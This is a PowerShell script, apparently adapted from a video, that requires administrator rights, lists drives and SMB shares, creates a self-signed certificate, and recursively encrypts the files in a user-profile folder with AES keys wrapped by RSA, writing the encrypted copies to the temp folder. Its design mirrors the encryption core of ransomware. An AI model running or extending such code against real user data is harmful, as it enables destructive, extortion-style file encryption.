# Source original script found here https://www.youtube.com/watch?v=atL1WmmMJJw

Class Drives
{
    [Drive[]]           $PSDrives
    [Drive[]]         $FileSystem
    [Drive[]]            $Network
    [Drive[]]          $CertStore
    [Object[]]             $Samba
    
    Drives()
    {
        $This.PSDrives            = Get-PSDrive      | % { [Drive]::New($_) } | Sort-Object Mode
        $This.FileSystem          = $This.PSDrives   | ? Mode -eq 0 | Sort-Object Root 
        $This.Network             = $This.FileSystem | ? DisplayRoot
        $This.CertStore           = $This.PSDrives   | ? Mode -eq 1
        $This.Samba               = Get-SMBShare     | Sort-Object Path
    }
}

Class Drive
{
    [Object]                $Name
    Hidden [String] $FullProvider
    [String]            $Provider
    [String]                $Root
    [String]         $DisplayRoot
    [String]         $Description
    Hidden [Int32]          $Mode

    Drive([Object]$Drive)
    {
        $This.Name                = $Drive.Name
        $This.FullProvider        = $Drive.Provider
        $This.Provider            = Split-Path -Leaf $Drive.Provider
        $This.Root                = $Drive.Root
        $This.DisplayRoot         = $Drive.DisplayRoot
        $This.Description         = If ( ! $Drive.Description ) { "-" } Else { $Drive.Description }
        $This.Mode                = Switch ( Split-Path -Leaf $Drive.Provider )
        { 
            FileSystem   {0} Certificate  {1} Environment  {2} Registry     {3} Temp         {4} 
            Alias        {5} Function     {6} Variable     {7} WSMan        {8} Default     {-1} 
        }
    }
}

Class File
{
    [String]                $Mode
    [DateTime]              $Date
    [Int32]                $Depth
    [String]                $Name
    [String]            $FullName
    [Object]            $Provider

    [System.IO.FileStream]                      $StreamWriter
    [Object]                                       $Transform
    [System.Security.Cryptography.CryptoStream] $CryptoStream
    [System.IO.FileStream]                      $StreamReader

    [Int32]               $XCount
    [Int32]               $Offset
    [Int32]       $BlockSizeBytes
    [Byte[]]                $Data
    [Int32]            $BytesRead 
    
    File([Object]$Provider,[String]$Path)
    {
        If ( ! ( Test-Path $Path ) )
        {
            Throw "Invalid Path"
        }

        Write-Host "Processing [+] $Path"

        [System.IO.FileInfo]::New($Path) | % {

            $This.Mode            = $_.Mode
            $This.Date            = $_.LastWriteTime
            $This.Depth           = $_.FullName.Split("\").Count - 2
            $This.Name            = $_.Name
            $This.FullName        = $_.FullName
            $This.Provider        = $Provider
        }

        $This.StreamWriter        = New-Object System.IO.FileStream("$env:temp\$($This.Name)",[System.IO.FileMode]::Create)
        $This.StreamWriter.Write($This.Provider.Key,0,4)
        $This.StreamWriter.Write($This.Provider.IV,0,4)
        $This.StreamWriter.Write($This.Provider.KeyExchange,0,$This.Provider.KeyLength)
        $This.StreamWriter.Write($This.Provider.AESProvider.IV,0,$This.Provider.IVLength)

        $This.Transform           = $This.Provider.AESProvider.CreateEncryptor()
        $This.CryptoStream        = New-Object System.Security.Cryptography.CryptoStream($This.StreamWriter,$This.Transform,[System.Security.Cryptography.CryptoStreamMode]::Write)
        
        $This.XCount              = 0
        $This.Offset              = 0
        $This.BlockSizeBytes      = $This.Provider.AESProvider.BlockSize / 8
        $This.Data                = New-Object Byte[]($This.BlockSizeBytes)
        $This.BytesRead           = 0

        $This.StreamReader        = New-Object System.IO.FileStream($This.FullName,[System.IO.FileMode]::Open) 

        Do
        {
            $This.XCount          = $This.StreamReader.Read($This.Data,0,$This.BlockSizeBytes)
            $This.Offset         += $This.XCount
            $This.CryptoStream.Write($This.Data,0,$This.XCount)
            $This.BytesRead      += $This.BlockSizeBytes
        }
        While ($This.XCount -gt 0 )

        $This.CryptoStream.FlushFinalBlock()
        $This.CryptoStream.Close()
        $This.StreamReader.Close()
        $This.StreamWriter.Close()
    }
}

Class Host
{
    Hidden [String]         $Name = $Env:ComputerName.ToLower()
    Hidden [String]          $DNS = $env:USERDNSDOMAIN.ToLower()
    Hidden [String]      $NetBIOS = $Env:UserDomain.ToLower()

    [String]            $Hostname
    [String]            $Username = [Environment]::UserName
    [Object]           $Principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    [Bool]               $IsAdmin
    [Object]         $Certificate
    [Provider]          $Provider

    [Drives]              $Drives = [Drives]::New()
    [Object]             $Profile = (Get-ChildItem $Env:UserProfile | ? Name -in Documents2 | % { $_.FullName } )
    [Object]             $Content

    Host()
    {
        $This.Hostname            = @($This.Name;"{0}.{1}" -f $This.Name, $This.DNS)[(Get-CimInstance Win32_ComputerSystem).PartOfDomain].ToLower()
        $This.IsAdmin             = $This.Principal.IsInRole("Administrator") -or $This.Principal.IsInRole("Administrators")
        
        If ( $This.IsAdmin -eq 0 )
        {
            Throw "Must run as administrator"
        }

        $This.Certificate         = New-SelfSignedCertificate -CertStoreLocation Cert:\LocalMachine\My -DnsName $This.HostName
        $This.Provider            = [Provider]::New($This.Certificate)
        $This.Content             = Get-ChildItem $This.Profile -Recurse | ? PsIsContainer -eq $False | % { [File]::New($This.Provider,$_.FullName) }
    }
}

Class Provider
{
    [String] $Name
    Hidden [System.Security.Cryptography.X509Certificates.X509Certificate2] $Certificate
    [System.Security.Cryptography.AesManaged] $AESProvider
    [System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter]  $KeyFormatter
    [Byte[]] $KeyExchange
    [Int32]  $KeyLength
    [Byte[]] $Key
    [Int32]  $IVLength
    [Byte[]]                    $IV

    Provider([System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate)
    {
        $This.Certificate         = $Certificate
        $This.AESProvider         = New-Object System.Security.Cryptography.AesManaged
        $This.AESProvider         | % { 
            
            $_.KeySize            = 256
            $_.BlockSize          = 128
            $_.Mode               = [System.Security.Cryptography.CipherMode]::CBC
        }

        $This.Name                = $This.AESProvider.GetType()
        $This.KeyFormatter        = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Certificate.PublicKey.Key)
        $This.KeyExchange         = $This.KeyFormatter.CreateKeyExchange($This.AESProvider.Key,$This.Name)
        $This.KeyLength           = $This.KeyExchange.Length
        $This.Key                 = [System.BitConverter]::GetBytes($This.KeyLength)
        $This.IVLength            = $This.AesProvider.IV.Length
        $This.IV                  = [System.BitConverter]::GetBytes($This.IVLength)
    }
}

$Hose = [Host]::New()
